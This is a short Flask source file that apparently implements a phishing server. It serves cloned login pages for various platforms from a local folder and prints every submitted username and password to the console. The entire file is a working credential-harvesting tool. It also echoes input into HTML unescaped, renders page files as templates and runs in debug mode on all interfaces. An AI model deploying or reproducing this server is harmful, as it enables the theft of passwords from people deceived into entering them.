from flask import Flask, request, render_template_string, abort
import os

app = Flask(__name__)
PLATFORM_DIR = "platforms"

@app.route("/", methods=["GET"])
def serve_login_page():
    relative_path = os.environ.get("LOGIN_PAGE")
    if not relative_path:
        return "No login page selected (LOGIN_PAGE env var not set).", 400

    full_path = os.path.join(PLATFORM_DIR, relative_path)
    if not os.path.exists(full_path):
        return abort(404)

    with open(full_path, "r") as f:
        html = f.read()
    return render_template_string(html)

@app.route("/login", methods=["POST"])
def handle_login():
    username = request.form.get("username")
    password = request.form.get("password")

    print(f"[+] Username: {username}")
    print(f"[+] Password: {password}")

    return f"""
    <h2>Login Received</h2>
    <p><b>Username:</b> {username}</p>
    <p><b>Password:</b> {password}</p>
    <a href="/">Back to login</a>
    """

if __name__ == "__main__":
    app.run(host='0.0.0.0',port=5000,debug=True)

